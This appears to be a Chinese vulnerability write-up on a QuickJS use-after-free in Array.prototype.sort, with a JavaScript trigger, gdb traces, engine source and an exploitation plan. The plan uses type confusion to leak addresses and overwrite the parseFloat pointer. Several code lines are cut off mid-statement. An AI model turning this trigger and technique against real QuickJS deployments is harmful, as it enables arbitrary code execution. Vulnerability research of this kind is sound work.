    14849                 for(i = -2; i {throw 1;});  
try {  
a.sort(function(v){return 0;}); //调用js_array_sort函数，调用之前设置的函数，抛出异常。  
} catch (e){  
//处理异常的时候，object引用次数减1  
}**
//调用js_array_sort
    34645 static JSValue js_array_sort(JSContext *ctx, JSValueConst this_val,
    34646                              int argc, JSValueConst *argv)
    34647 {
    34648     struct array_sort_context asc = { ctx, 0, 0, argv[0] };
    34649     JSValue obj = JS_UNDEFINED;
    34650     ValueSlot *array = NULL;
    34651     size_t array_size = 0, pos = 0, n = 0;
    34652     int64_t i, len, undefined_count = 0;
    34653     int present;
    34654 
    34655     if (!JS_IsUndefined(asc.method)) {
    34656         if (check_function(ctx, asc.method))
    34657             goto exception;
    34658         asc.has_method = 1;
    34659     }
    34660     obj = JS_ToObject(ctx, this_val);
    34661     if (js_get_length64(ctx, &len, obj))
    34662         goto exception;
    34719 exception:
    34720     for (n = 0; n , argc=0x0, argv=0x7fffffff4ab0)
        at quickjs.c:34647
    #1  0x0000000000553606 in js_call_c_function (ctx=0x614000000040, func_obj=..., this_obj=..., argc=0x1, argv=0x7fffffff8fd0, flags=0x0)
        at quickjs.c:14236
    #2  0x000000000053642d in JS_CallInternal (ctx=0x614000000040, func_obj=..., this_obj=..., new_target=..., argc=0x1, argv=0x7fffffff8fd0, flags=0x0)
        at quickjs.c:14430
    #3  0x000000000053ba6a in JS_CallInternal (ctx=0x614000000040, func_obj=..., this_obj=..., new_target=..., argc=0x0, argv=0x0, flags=0x2)
        at quickjs.c:14843
    #4  0x0000000000522412 in JS_CallFree (ctx=0x614000000040, func_obj=..., this_obj=..., argc=0x0, argv=0x0) at quickjs.c:16768
    exception 的时候object引用次数减1
    此时0x00006070000091d0
    gdb-peda$ p *(JSRefCountHeader*)0x00006070000091d0
    $56 = {
      ref_count = 0x1
    }
**let a = [{hack:0},1,2,3,4];  
a[0] = 0; //重新为a[0]赋值，之前a[0]的值是一个object对象，判断引用次数，如果为0，则释放该对象。**
    创建数组
    第二步数组赋值
    15884         CASE(OP_put_array_el):
    15885             {
    15886                 int ret;
    15887 
    15888                 ret = JS_SetPropertyValue(ctx, sp[-3], sp[-2], sp[-1], JS_PROP_THROW_STRICT);
    15889                 JS_FreeValue(ctx, sp[-3]);
    15890                 sp -= 3;
    15891                 if (unlikely(ret ref_count {throw 1;});  
try {  
a.sort(function(v){return 0;});  
} catch (e){ }  
a[0] = 1; //同理上面  
refcopy[0]; //最后heap use after free  
while(1);**
    //取数组值
    15821         CASE(OP_get_array_el):
    15822             {
    15823                 JSValue val;
    15824 
    15825                 val = JS_GetPropertyValue(ctx, sp[-2], sp[-1]);
    15826                 JS_FreeValue(ctx, sp[-2]);
    15827                 sp[-2] = val;
    15828                 sp--;
    15829                 if (unlikely(JS_IsException(val)))
    15830                     goto exception;
    15831             }
    15832             BREAK;
    //使用内存
    575 static inline JSValue JS_DupValue(JSContext *ctx, JSValueConst v)
    576 {
    577     if (JS_VALUE_HAS_REF_COUNT(v)) {
    578         JSRefCountHeader *p = JS_VALUE_GET_PTR(v);
    579         p->ref_count++;
    580     }
    581     return (JSValue)v;
    582 }
## 0x3 利用
利用exp见文章末尾。
漏洞利用最终实现过程，利用free掉的内存造成类型混淆，利用类型混淆泄漏任意地址，得到parseFloat函数地址，利用任意地址写任意内容，覆盖parseFloat函数地址跳到我们的可控地址。
### 3.1
### 调用parseFloat函数的过程
    RAX  0x46f680 (js_parseFloat) ◂— push   rbp
    RIP  0x416e2b (js_call_c_function+603) ◂— call   rax
    ─────────────[ DISASM ]─────────────
     ► 0x416e2b     call   rax 
    ─────────────[ SOURCE (CODE) ]─────────
    In file: /home/test/Desktop/quick/quickjs-2019-07-09xx/quickjs.c
       14231             }
       14232         }
       14233         /* here this_obj is new_target */
       14234         /* fall thru */
       14235     case JS_CFUNC_generic:
     ► 14236         ret_val = func.generic(ctx, this_obj, argc, arg_buf);
       14237         break;
### 3.2
### 几个关键的结构体
JSObject
    667 struct JSObject {
      668     JSRefCountHeader header; /* must come first, 32-bit */
      669     JSGCHeader gc_header; /* must come after JSRefCountHeader, 8-bit */
      670     uint8_t extensible : 1;
      671     uint8_t free_mark : 1; /* only used when freeing objects with cycles */
      672     uint8_t is_exotic : 1; /* TRUE if object has exotic property handlers */
      673     uint8_t fast_array : 1; /* TRUE if u.array is used for get/put */
      674     uint8_t is_constructor : 1; /* TRUE if object is a constructor function */
      675     uint8_t is_uncatchable_error : 1; /* if TRUE, error is not catchable */
      676     uint8_t is_class : 1; /* TRUE if object is a class constructor */
      677     uint8_t tmp_mark : 1; /* used in JS_WriteObjectRec() */
      678     uint16_t class_id; /* see JS_CLASS_x */
      679     /* byte offsets: 8/8 */
      680     struct list_head link; /* object list */
      681     /* byte offsets: 16/24 */
      682     JSShape *shape; /* prototype and property names + flag */
      683     JSProperty *prop; /* array of properties */
      684     /* byte offsets: 24/40 */
      685     struct JSMapRecord *first_weak_ref; /* XXX: use a bit and an external hash table? */
      686     /* byte offsets: 28/48 */
      687     union {
                    ....
                    ....
                    ...
              }
JSString
    384 struct JSString {
      385     JSRefCountHeader header; /* must come first, 32-bit */
      386     uint32_t len : 31;
      387     uint8_t is_wide_char : 1; /* 0 = 8 bits, 1 = 16 bits characters */
      388     uint32_t hash : 30;
      389     uint8_t atom_type : 2; /* != 0 if atom, JS_ATOM_TYPE_x */